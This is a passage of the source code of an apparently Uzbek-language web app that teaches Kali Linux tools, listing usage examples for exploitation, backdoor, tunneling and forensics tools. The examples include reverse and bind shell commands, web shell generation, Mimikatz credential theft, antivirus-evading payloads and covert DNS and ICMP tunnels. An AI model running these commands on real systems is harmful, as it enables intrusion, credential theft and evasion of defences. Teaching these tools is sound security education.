    category: "Exploitation Tools",
    description: "PowerShell post-exploitation framework",
    usage: "Import-Module PowerSploit",
    examples: ["Invoke-Mimikatz", "Get-System", "Invoke-Shellcode"],
    explanation: "Powersploit Windows post-exploitation uchun PowerShell framework. Memory-based attacks.",
    output: "PowerSploit loaded successfully\nCredentials extracted from memory",
    icon: "⚡",
    difficulty: "Advanced",
  },
  {
    id: 56,
    name: "Empire",
    category: "Exploitation Tools",
    description: "PowerShell and Python post-exploitation agent",
    usage: "empire",
    examples: ["listeners", "usestager windows/launcher_bat", "agents"],
    explanation: "Empire post-exploitation framework. PowerShell va Python agents ishlatadi. C2 server functionality.",
    output:
      "(Empire) > listeners\n[*] Active listeners:\nName              Module          Host                                 Delay/Jitter   KillDate",
    icon: "👑",
    difficulty: "Advanced",
  },
  {
    id: 57,
    name: "Veil",
    category: "Exploitation Tools",
    description: "Payload generator and antivirus evasion tool",
    usage: "veil",
    examples: ["use 1 (Evasion)", "use python/meterpreter/rev_tcp", "generate"],
    explanation: "Veil antivirus evasion uchun payload generator. Metasploit payloads encode qiladi.",
    output: "Veil-Evasion Menu\n1) Evasion\n2) Ordnance\nPlease enter a framework selection:",
    icon: "👻",
    difficulty: "Advanced",
  },
  {
    id: 58,
    name: "Weevely",
    category: "Maintaining Access",
    description: "Web shell designed for post-exploitation",
    usage: "weevely [options]",
    examples: [
      "weevely generate password123 shell.php",
      "weevely http://target.com/shell.php password123",
      ":audit_filesystem",
    ],
    explanation: "Weevely PHP web shell post-exploitation uchun ishlatiladi. Steganography ishlatib yashirinadi.",
    output: "Generated backdoor with password 'password123' in 'shell.php'\nweevely> :audit_filesystem",
    icon: "🕸️",
    difficulty: "Advanced",
  },
  {
    id: 59,
    name: "Dbd",
    category: "Maintaining Access",
    description: "Netcat-clone designed to be portable",
    usage: "dbd [options]",
    examples: ["dbd -l -p 4444", "dbd target.com 4444", "dbd -l -p 4444 -e /bin/bash"],
    explanation: "Dbd Netcat alternative. Backdoor va reverse shell yaratish uchun ishlatiladi.",
    output: "listening on [any] 4444 ...\nconnect to [192.168.1.100] from target.com [192.168.1.5] 54321",
    icon: "🚪",
    difficulty: "Intermediate",
  },
  {
    id: 60,
    name: "Cryptcat",
    category: "Maintaining Access",
    description: "Encrypted version of netcat",
    usage: "cryptcat [options] hostname port",
    examples: [
      "cryptcat -l -p 4444 -k password123",
      "cryptcat target.com 4444 -k password123",
      "cryptcat -l -p 4444 -k password123 -e /bin/bash",
    ],
    explanation: "Cryptcat encrypted netcat. Secure backdoor connection yaratish uchun ishlatiladi.",
    output: "listening on [any] 4444 ...\nconnect to [192.168.1.100] from target.com [192.168.1.5] 54321 (encrypted)",
    icon: "🔐",
    difficulty: "Intermediate",
  },
  {
    id: 61,
    name: "Intersect",
    category: "Maintaining Access",
    description: "Post-exploitation framework",
    usage: "intersect",
    examples: ["generate payload", "start listener", "interact with session"],
    explanation: "Intersect post-exploitation framework. Multi-platform backdoor va C2 functionality.",
    output: "Intersect Framework v1.0\nSession established with target",
    icon: "🔗",
    difficulty: "Advanced",
  },
  {
    id: 62,
    name: "Nishang",
    category: "Maintaining Access",
    description: "PowerShell for penetration testing",
    usage: "Import-Module Nishang",
    examples: ["Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.5 -Port 4444", "Get-Information", "Copy-VSS"],
    explanation: "Nishang PowerShell penetration testing framework. Windows post-exploitation uchun ishlatiladi.",
    output: "PowerShell reverse shell established\nConnection from 192.168.1.100:54321",
    icon: "🔋",
    difficulty: "Advanced",
  },
  {
    id: 63,
    name: "Proxychains",
    category: "Maintaining Access",
    description: "Proxy chains for anonymity",
    usage: "proxychains [command]",
    examples: ["proxychains nmap 192.168.1.100", "proxychains firefox", "proxychains ssh user@target.com"],
    explanation:
      "Proxychains traffic proxy orqali yo'naltirish uchun ishlatiladi. Anonymity va pivoting uchun foydali.",
    output:
      "[proxychains] config file found: /etc/proxychains.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4",
    icon: "🔗",
    difficulty: "Intermediate",
  },
  {
    id: 64,
    name: "Tor",
    category: "Maintaining Access",
    description: "Anonymity network",
    usage: "tor",
    examples: ["tor", "torify command", "torsocks command"],
    explanation: "Tor anonymity network. Traffic encrypt qilib multiple relay orqali yo'naltiradi.",
    output: "Tor v0.4.7.8 running on Linux\nBootstrapped 100%: Done",
    icon: "🧅",
    difficulty: "Beginner",
  },
  {
    id: 65,
    name: "Stunnel",
    category: "Maintaining Access",
    description: "SSL encryption wrapper",
    usage: "stunnel [config_file]",
    examples: ["stunnel /etc/stunnel/stunnel.conf", "stunnel -d 443 -r 80", "stunnel -c -d 8080 -r target.com:443"],
    explanation: "Stunnel SSL/TLS encryption wrapper. Plain text connections encrypt qilish uchun ishlatiladi.",
    output: "stunnel 5.56 on x86_64-pc-linux-gnu platform\nThreading:PTHREAD Sockets:POLL,IPv6 TLS:OpenSSL 1.1.1f",
    icon: "🔒",
    difficulty: "Intermediate",
  },
  {
    id: 66,
    name: "Httptunnel",
    category: "Maintaining Access",
    description: "Tunnel arbitrary connections through HTTP",
    usage: "httptunnel [options]",
    examples: ["hts -F localhost:22 80", "htc -F 2222 proxy.com:80", "ssh -p 2222 user@localhost"],
    explanation: "Httptunnel HTTP orqali arbitrary connections tunnel qilish uchun ishlatiladi. Firewall bypass.",
    output: "httptunnel server started on port 80\nForwarding connections to localhost:22",
    icon: "🚇",
    difficulty: "Advanced",
  },
  {
    id: 67,
    name: "Ptunnel",
    category: "Maintaining Access",
    description: "Tunnel TCP connections over ICMP",
    usage: "ptunnel [options]",
    examples: [
      "ptunnel -p proxy.com",
      "ptunnel -p proxy.com -lp 8080 -da target.com -dp 22",
      "ssh -p 8080 user@localhost",
    ],
    explanation: "Ptunnel ICMP packets orqali TCP connections tunnel qilish uchun ishlatiladi. Covert channel.",
    output: "ptunnel v 0.72\nStarting tunnel (pid=1234)\nConnection established",
    icon: "🏔️",
    difficulty: "Advanced",
  },
  {
    id: 68,
    name: "Dns2tcp",
    category: "Maintaining Access",
    description: "TCP over DNS tunnel",
    usage: "dns2tcp [options]",
    examples: ["dns2tcpd -F -D domain.com", "dns2tcpc -z domain.com proxy.com", "ssh -p 2222 user@localhost"],
    explanation: "Dns2tcp DNS queries orqali TCP connections tunnel qilish uchun ishlatiladi. DNS tunneling.",
    output: "dns2tcp server started\nListening for DNS queries on domain.com",
    icon: "🌐",
    difficulty: "Advanced",
  },
  {
    id: 69,
    name: "Iodine",
    category: "Maintaining Access",
    description: "IPv4 over DNS tunnel",
    usage: "iodine [options] nameserver topdomain",
    examples: [
      "iodined -f -c -P password123 10.0.0.1 tunnel.com",
      "iodine -f -P password123 ns.tunnel.com tunnel.com",
      "ssh user@10.0.0.1",
    ],
    explanation: "Iodine DNS orqali IPv4 traffic tunnel qilish uchun ishlatiladi. TUN/TAP interface yaratadi.",
    output: "Opened dns0\nSetting IP of dns0 to 10.0.0.2\nConnection setup complete, transmitting data.",
    icon: "💎",
    difficulty: "Advanced",
  },
  {
    id: 70,
    name: "Miredo",
    category: "Maintaining Access",
    description: "Teredo IPv6 tunneling",
    usage: "miredo [options]",
    examples: ["miredo", "miredo -f", "miredo-checkconf"],
    explanation: "Miredo IPv4 network orqali IPv6 connectivity provide qilish uchun Teredo tunneling ishlatadi.",
    output: "miredo: Starting...\nmiredo: IPv6 connectivity established",
    icon: "6️⃣",
    difficulty: "Advanced",
  },
  {
    id: 71,
    name: "Binwalk",
    category: "Forensics Tools",
    description: "Firmware analysis tool",
    usage: "binwalk [options] file",
    examples: ["binwalk firmware.bin", "binwalk -e firmware.bin", "binwalk -M firmware.bin"],
    explanation:
      "Binwalk firmware va binary files analyze qilish uchun ishlatiladi. Embedded files extract qilish mumkin.",
    output:
      "DECIMAL       HEXADECIMAL     DESCRIPTION\n0             0x0             LZMA compressed data\n1024          0x400           Squashfs filesystem",
    icon: "🔍",
    difficulty: "Intermediate",
  },
  {
    id: 72,
    name: "Foremost",
    category: "Forensics Tools",
    description: "File carving tool",
    usage: "foremost [options] file",
    examples: ["foremost -i disk.img", "foremost -t jpg,png -i disk.img", "foremost -o output_dir -i disk.img"],
    explanation: "Foremost deleted yoki corrupted files recover qilish uchun file carving ishlatadi.",
    output: "Processing: disk.img\n|*|*|*|*|*|*|*|*|*|*|\nFiles Extracted: 15",
    icon: "🗂️",
    difficulty: "Beginner",
  },
  {
    id: 73,
    name: "Volatility",
    category: "Forensics Tools",
    description: "Memory forensics framework",
    usage: "volatility [options]",
    examples: [
      "volatility -f memory.dmp imageinfo",
      "volatility -f memory.dmp --profile=Win7SP1x64 pslist",
      "volatility -f memory.dmp --profile=Win7SP1x64 netscan",
    ],
    explanation:
      "Volatility memory dump analysis uchun ishlatiladi. Running processes, network connections va malware detect qilish mumkin.",
    output:
      "Offset(V)  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start\n0x85e8a830 System                    4      0     84      511 ------      0",
    icon: "🧠",
    difficulty: "Advanced",
  },
  {
    id: 74,
    name: "Autopsy",
    category: "Forensics Tools",
    description: "Digital forensics platform",
    usage: "autopsy",
    examples: ["Start Autopsy web interface", "Create new case", "Add disk image as data source"],
    explanation: "Autopsy digital forensics investigation uchun GUI platform. Disk images, files va timeline analysis.",
    output: "Autopsy Forensic Browser\nCase Management Interface\nTimeline Analysis Available",
    icon: "🔬",
    difficulty: "Intermediate",
  },
  {
    id: 75,
    name: "Sleuthkit",
    category: "Forensics Tools",
    description: "Digital investigation tools",
    usage: "Various TSK tools",
    examples: ["fls -r disk.img", "icat disk.img 1234", "mmls disk.img"],
    explanation: "Sleuthkit digital forensics uchun command-line tools collection. File system analysis.",
    output: "r/r 1234:   deleted_file.txt\nd/d 5678:   Documents\nr/r 9012:   important.doc",
    icon: "🕵️",
    difficulty: "Advanced",
  },
  {
    id: 76,
    name: "Bulk-extractor",
    category: "Forensics Tools",
    description: "Digital forensics tool",
    usage: "bulk_extractor [options] image",
    examples: [
      "bulk_extractor -o output disk.img",
      "bulk_extractor -x all -o output disk.img",
      "bulk_extractor -S jpeg_carve_mode=1 disk.img",
    ],
    explanation: "Bulk-extractor disk images va files dan useful information extract qilish uchun ishlatiladi.",
    output: "bulk_extractor version: 1.6.0\nInput file: disk.img\nOutput directory: output\nExtracting features...",
    icon: "⛏️",
    difficulty: "Intermediate",
  },
  {
    id: 77,
    name: "Hashdeep",
    category: "Forensics Tools",
    description: "File hashing and verification tool",
    usage: "hashdeep [options] files",
    examples: [
      "hashdeep -r /path/to/directory",
      "hashdeep -c known_hashes.txt /path/to/files",
      "hashdeep -b /path/to/files > hashes.txt",
    ],
    explanation: "Hashdeep files integrity verification uchun hash calculate va compare qilish uchun ishlatiladi.",
    output: "hashdeep: Audit passed\n   Files matched: 150\n   Files moved: 0\n   Files changed: 0",
    icon: "🔐",
    difficulty: "Beginner",
  },
  {
    id: 78,
    name: "Dc3dd",
    category: "Forensics Tools",
    description: "Enhanced dd for forensics",
    usage: "dc3dd [options]",
    examples: [
      "dc3dd if=/dev/sda of=disk_image.dd hash=md5",
      "dc3dd if=disk.img of=/dev/sdb verify=on",
      "dc3dd if=/dev/sda of=image.dd log=logfile.txt",
    ],
    explanation: "Dc3dd forensic disk imaging uchun enhanced dd tool. Hash verification va logging support.",
    output:
      "dc3dd 7.2.641 started at 2023-12-25 12:34:56 +0000\ncopied 1000000000 bytes (1.0 GB) in 120 s\nmd5 hash: 5d41402abc4b2a76b9719d911017c592",
    icon: "💿",
    difficulty: "Intermediate",
  },
  {
    id: 79,
    name: "Ddrescue",
    category: "Forensics Tools",
    description: "Data recovery tool",
    usage: "ddrescue [options] infile outfile mapfile",
    examples: [
      "ddrescue /dev/sda disk_image.dd mapfile.log",
      "ddrescue -r3 /dev/sda disk_image.dd mapfile.log",
      "ddrescue --force /dev/sda disk_image.dd mapfile.log",
    ],
    explanation: "Ddrescue damaged disk dan data recovery qilish uchun ishlatiladi. Bad sectors skip qiladi.",
    output:
      "GNU ddrescue 1.25\nPress Ctrl+C to interrupt\nrescued:     1000 MB,  errsize:       0 B,  current rate:    50 MB/s",
    icon: "🚑",
    difficulty: "Intermediate",
  },
  {
    id: 80,
    name: "Safecopy",
    category: "Forensics Tools",
    description: "Data recovery tool for damaged media",
    usage: "safecopy [options] source dest",
    examples: [
      "safecopy /dev/sda disk_image.dd",
      "safecopy --stage1 /dev/sda disk_image.dd",
      "safecopy -b 4096 /dev/sda disk_image.dd",
    ],
    explanation: "Safecopy damaged media dan data recovery qilish uchun ishlatiladi. Multiple recovery stages.",
    output: "source:      /dev/sda\ndestination: disk_image.dd\nbadblocks:   0\nstage1 recovery completed successfully",
    icon: "🛡️",
    difficulty: "Intermediate",
  },
  {
    id: 81,
    name: "Guymager",
    category: "Forensics Tools",
    description: "Forensic imaging tool with GUI",
    usage: "guymager",
    examples: ["Start Guymager GUI", "Select source device", "Configure imaging options"],
    explanation: "Guymager forensic disk imaging uchun GUI tool. Hash verification va compression support.",
    output: "Guymager Forensic Imager\nDevice: /dev/sda (1TB)\nImaging progress: 45%\nHash: MD5, SHA-256",
    icon: "🖥️",
    difficulty: "Beginner",
  },
  {
    id: 82,
    name: "Chkrootkit",
    category: "Forensics Tools",
    description: "Rootkit checker",
    usage: "chkrootkit [options]",
    examples: ["chkrootkit", "chkrootkit -q", "chkrootkit -x | less"],
    explanation: "Chkrootkit system rootkit infection check qilish uchun ishlatiladi. Known rootkits detect qiladi.",
    output:
      "ROOTDIR is `/'\nChecking `amd'... not found\nChecking `basename'... not infected\nChecking `biff'... not found",
    icon: "🔍",
    difficulty: "Beginner",
  },
  {
    id: 83,
    name: "Rkhunter",
    category: "Forensics Tools",
    description: "Rootkit hunter",
    usage: "rkhunter [options]",
    examples: ["rkhunter --check", "rkhunter --update", "rkhunter --propupd"],
    explanation: "Rkhunter rootkits, backdoors va local exploits detect qilish uchun ishlatiladi.",
    output:
      "[ Rootkit Hunter version 1.4.6 ]\nChecking system commands...\n  Checking which... [ OK ]\n  Checking whoami... [ OK ]",
    icon: "🏹",
    difficulty: "Beginner",
  },
  {
    id: 84,
    name: "Lynis",
    category: "Forensics Tools",
    description: "Security auditing tool",
    usage: "lynis [mode] [options]",
    examples: ["lynis audit system", "lynis show profiles", "lynis update info"],
    explanation: "Lynis system security audit va hardening guidance uchun ishlatiladi. Comprehensive security scan.",
    output:
      "[ Lynis 3.0.8 ]\n\n  * Test category: System tools\n  * Checking for available system tools...\n    - Checking /bin... [ FOUND ]",
    icon: "🦁",
    difficulty: "Intermediate",
  },
  {
    id: 85,
    name: "Unhide",
    category: "Forensics Tools",
    description: "Hidden processes and ports detector",
    usage: "unhide [options]",
    examples: ["unhide proc", "unhide tcp", "unhide quick"],
    explanation: "Unhide hidden processes va network ports detect qilish uchun ishlatiladi. Rootkit detection.",
    output: "Unhide 20130526\nUsed options: proc\nPID found: 1234 (hidden from ps)\nPossible rootkit: LKM Rootkit",
    icon: "👁️",
    difficulty: "Intermediate",
  },
]

const categories = [
  "All",
  "Information Gathering",
  "Vulnerability Analysis",
  "Web Applications",
  "Database Assessment",
  "Password Attacks",
  "Wireless Attacks",
  "Reverse Engineering",
  "Exploitation Tools",
  "Sniffing & Spoofing",
  "Maintaining Access",
  "Reporting Tools",
  "Forensics Tools",
  "Stress Testing",
  "Hardware Hacking",
]

const getCategoryIcon = (category: string) => {
  const icons: { [key: string]: string } = {
    "Information Gathering": "🔍",
    "Vulnerability Analysis": "🛡️",
    "Web Applications": "🌐",
    "Database Assessment": "🗄️",
    "Password Attacks": "🔐",
    "Wireless Attacks": "📶",
    "Reverse Engineering": "🔄",
    "Exploitation Tools": "💥",
    "Sniffing & Spoofing": "📡",
    "Maintaining Access": "🔗",
    "Reporting Tools": "📊",
    "Forensics Tools": "🔬",
    "Stress Testing": "⚡",
    "Hardware Hacking": "🔧",
  }
  return icons[category] || "🛠️"
}

export default function KaliToolsLearningPlatform() {
  const [searchTerm, setSearchTerm] = useState("")
  const [selectedCategory, setSelectedCategory] = useState("All")
  const [selectedTool, setSelectedTool] = useState<(typeof kaliTools)[0] | null>(null)
  const { toast } = useToast()

  const filteredTools = useMemo(() => {
    return kaliTools.filter((tool) => {
      const matchesSearch =
        tool.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
        tool.description.toLowerCase().includes(searchTerm.toLowerCase()) ||
        tool.explanation.toLowerCase().includes(searchTerm.toLowerCase())
      const matchesCategory = selectedCategory === "All" || tool.category === selectedCategory
      return matchesSearch && matchesCategory
    })
  }, [searchTerm, selectedCategory])

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text)
    toast({
      title: "Nusxalandi!",
      description: "Kod clipboard ga nusxalandi",
    })
  }

  const getDifficultyColor = (difficulty: string) => {
    switch (difficulty) {
      case "Beginner":
        return "bg-green-100 text-green-800"
      case "Intermediate":
        return "bg-yellow-100 text-yellow-800"
      case "Advanced":
        return "bg-red-100 text-red-800"
      default:
        return "bg-gray-100 text-gray-800"
    }
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900">
      {/* Header */}
      <div className="bg-black/20 backdrop-blur-sm border-b border-white/10">
        <div className="container mx-auto px-4 py-6">
          <div className="flex items-center gap-3 mb-6">
            <Shield className="h-8 w-8 text-purple-400" />
            <h1 className="text-3xl font-bold text-white">Kali Linux Tools O'rganish Platformasi</h1>
          </div>

          {/* Search and Filter */}
          <div className="flex flex-col md:flex-row gap-4">
            <div className="relative flex-1">
              <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 h-4 w-4" />
              <Input
                placeholder="Tool nomi yoki tavsif bo'yicha qidiring..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="pl-10 bg-white/10 border-white/20 text-white placeholder:text-gray-400"
              />
            </div>
            <Select value={selectedCategory} onValueChange={setSelectedCategory}>
              <SelectTrigger className="w-full md:w-64 bg-white/10 border-white/20 text-white">
                <Filter className="h-4 w-4 mr-2" />
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                {categories.map((category) => (
                  <SelectItem key={category} value={category}>
                    <div className="flex items-center gap-2">
                      <span>{getCategoryIcon(category)}</span>
                      <span>{category}</span>
                    </div>
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>

          <div className="mt-4 text-sm text-gray-300">{filteredTools.length} ta tool topildi</div>
        </div>
      </div>

      <div className="container mx-auto px-4 py-8">
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
          {/* Tools List */}
          <div className="lg:col-span-1">
            <ScrollArea className="h-[calc(100vh-200px)]">
              <div className="space-y-4">
                {filteredTools.map((tool) => (
                  <Card
                    key={tool.id}
                    className={`cursor-pointer transition-all duration-200 hover:scale-105 bg-white/10 backdrop-blur-sm border-white/20 ${
                      selectedTool?.id === tool.id ? "ring-2 ring-purple-400" : ""
                    }`}
                    onClick={() => setSelectedTool(tool)}
                  >
                    <CardHeader className="pb-3">
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-3">
                          <span className="text-2xl">{tool.icon}</span>
                          <div>
                            <CardTitle className="text-white text-lg">{tool.name}</CardTitle>
                            <div className="flex items-center gap-2 mt-1">
                              <Badge variant="secondary" className="text-xs bg-purple-100 text-purple-800">
                                {getCategoryIcon(tool.category)} {tool.category}
                              </Badge>
                              <Badge className={`text-xs ${getDifficultyColor(tool.difficulty)}`}>
                                {tool.difficulty}
                              </Badge>
                            </div>
                          </div>
                        </div>
                      </div>
                      <CardDescription className="text-gray-300 text-sm mt-2">{tool.description}</CardDescription>
                    </CardHeader>
                  </Card>
                ))}
              </div>
            </ScrollArea>
          </div>

          {/* Tool Details */}
          <div className="lg:col-span-2">
            {selectedTool ? (
              <Card className="bg-white/10 backdrop-blur-sm border-white/20">
                <CardHeader>
                  <div className="flex items-center gap-4">
                    <span className="text-4xl">{selectedTool.icon}</span>
                    <div>
                      <CardTitle className="text-white text-2xl">{selectedTool.name}</CardTitle>
                      <div className="flex items-center gap-2 mt-2">
                        <Badge variant="secondary" className="bg-purple-100 text-purple-800">
                          {getCategoryIcon(selectedTool.category)} {selectedTool.category}
                        </Badge>
                        <Badge className={getDifficultyColor(selectedTool.difficulty)}>{selectedTool.difficulty}</Badge>
                      </div>
                    </div>
                  </div>
                  <CardDescription className="text-gray-300 text-lg mt-4">{selectedTool.description}</CardDescription>
                </CardHeader>

                <CardContent>
                  <Tabs defaultValue="usage" className="w-full">
                    <TabsList className="grid w-full grid-cols-4 bg-white/10">
                      <TabsTrigger value="usage" className="text-white data-[state=active]:bg-purple-600">
                        <Terminal className="h-4 w-4 mr-2" />
                        Ishlatish
                      </TabsTrigger>
                      <TabsTrigger value="examples" className="text-white data-[state=active]:bg-purple-600">
                        <Zap className="h-4 w-4 mr-2" />
                        Misollar
                      </TabsTrigger>
                      <TabsTrigger value="explanation" className="text-white data-[state=active]:bg-purple-600">
                        <Eye className="h-4 w-4 mr-2" />
                        Tushuntirish
                      </TabsTrigger>
                      <TabsTrigger value="output" className="text-white data-[state=active]:bg-purple-600">
                        <Database className="h-4 w-4 mr-2" />
                        Natija
                      </TabsTrigger>
                    </TabsList>

                    <TabsContent value="usage" className="mt-6">
                      <div className="space-y-4">
                        <h3 className="text-lg font-semibold text-white flex items-center gap-2">
                          <Terminal className="h-5 w-5" />
                          Asosiy Sintaksis
                        </h3>
                        <div className="relative">
                          <pre className="bg-black/50 text-green-400 p-4 rounded-lg font-mono text-sm overflow-x-auto">
                            {selectedTool.usage}
                          </pre>
                          <Button
                            size="sm"
                            variant="ghost"
                            className="absolute top-2 right-2 text-gray-400 hover:text-white"
                            onClick={() => copyToClipboard(selectedTool.usage)}
                          >
                            <Copy className="h-4 w-4" />
                          </Button>
                        </div>
                      </div>
                    </TabsContent>

                    <TabsContent value="examples" className="mt-6">
                      <div className="space-y-4">
                        <h3 className="text-lg font-semibold text-white flex items-center gap-2">
                          <Zap className="h-5 w-5" />
                          Amaliy Misollar
                        </h3>
                        <div className="space-y-3">
                          {selectedTool.examples.map((example, index) => (
                            <div key={index} className="relative">
                              <div className="flex items-center gap-2 mb-2">
                                <Badge variant="outline" className="text-xs text-purple-300 border-purple-300">
                                  Misol {index + 1}
                                </Badge>
                              </div>
                              <pre className="bg-black/50 text-green-400 p-4 rounded-lg font-mono text-sm overflow-x-auto">
                                {example}
                              </pre>
                              <Button
                                size="sm"
                                variant="ghost"
                                className="absolute top-8 right-2 text-gray-400 hover:text-white"
                                onClick={() => copyToClipboard(example)}
                              >
                                <Copy className="h-4 w-4" />
                              </Button>
                            </div>
                          ))}
                        </div>
                      </div>
                    </TabsContent>

                    <TabsContent value="explanation" className="mt-6">
                      <div className="space-y-4">
                        <h3 className="text-lg font-semibold text-white flex items-center gap-2">
                          <Eye className="h-5 w-5" />
                          Batafsil Tushuntirish
                        </h3>
                        <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-6">
                          <p className="text-gray-200 leading-relaxed text-base">{selectedTool.explanation}</p>
                        </div>
                      </div>
                    </TabsContent>

                    <TabsContent value="output" className="mt-6">
                      <div className="space-y-4">
                        <h3 className="text-lg font-semibold text-white flex items-center gap-2">
                          <Database className="h-5 w-5" />
                          Kutilayotgan Natija
                        </h3>
                        <div className="relative">
                          <pre className="bg-black/50 text-cyan-400 p-4 rounded-lg font-mono text-sm overflow-x-auto whitespace-pre-wrap">
                            {selectedTool.output}
                          </pre>
                          <Button
                            size="sm"
                            variant="ghost"
                            className="absolute top-2 right-2 text-gray-400 hover:text-white"
                            onClick={() => copyToClipboard(selectedTool.output)}
                          >
                            <Copy className="h-4 w-4" />
                          </Button>
                        </div>
                      </div>
                    </TabsContent>
                  </Tabs>
                </CardContent>
              </Card>
            ) : (
              <Card className="bg-white/10 backdrop-blur-sm border-white/20 h-96 flex items-center justify-center">
                <div className="text-center">
                  <Shield className="h-16 w-16 text-purple-400 mx-auto mb-4" />
                  <h3 className="text-xl font-semibold text-white mb-2">Tool tanlang</h3>
                  <p className="text-gray-300">
                    Chap tarafdan biror tool tanlang va uning batafsil ma'lumotlarini ko'ring
                  </p>
                </div>
              </Card>
            )}
          </div>
        </div>
      </div>
    </div>
  )
}
